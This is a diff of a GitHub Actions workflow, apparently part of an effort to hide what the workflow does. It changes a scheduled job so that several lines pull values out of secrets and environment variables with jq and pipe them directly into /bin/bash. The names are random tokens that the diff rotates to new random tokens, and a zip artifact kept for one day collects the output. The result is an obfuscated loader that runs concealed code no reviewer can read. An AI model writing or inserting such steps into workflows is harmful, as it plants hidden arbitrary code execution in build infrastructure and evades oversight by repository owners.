@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '54 2,8,14,20 * * *'
+    - cron: '11 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -20,16 +20,20 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          g9644: ${{ secrets.g9644 }}
+          zxm519: ${{ secrets.zxm519 }}
         run: |
-          printf '%s' "$g9644" | jq -r .qg6238 | /bin/bash
-          printf '%s' "$l3953" | jq -r .yct07177 | /bin/bash
-          printf '%s' "$fby3" | jq -r .tr57 | /bin/bash
+          printf '%s' "$zxm519" | jq -r .nsx21740 | /bin/bash
+          printf '%s' "$j78602" | jq -r .uuvkd00 | /bin/bash
+          echo $g9 | jq -r .hz77 | /bin/bash
+          printf '%s' "$rdnpv575" | jq -r .svpw0993 | /bin/bash
+          printf '%s' "$goue7657" | jq -r .sto47148 | /bin/bash
+          echo $niw57 | jq -r .wxz5483 | /bin/bash
+          printf '%s' "$hwr371" | jq -r .etuh40 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: o032ot7y
+          name: 6lb19K4p
           path: "*.zip"
           retention-days: 1
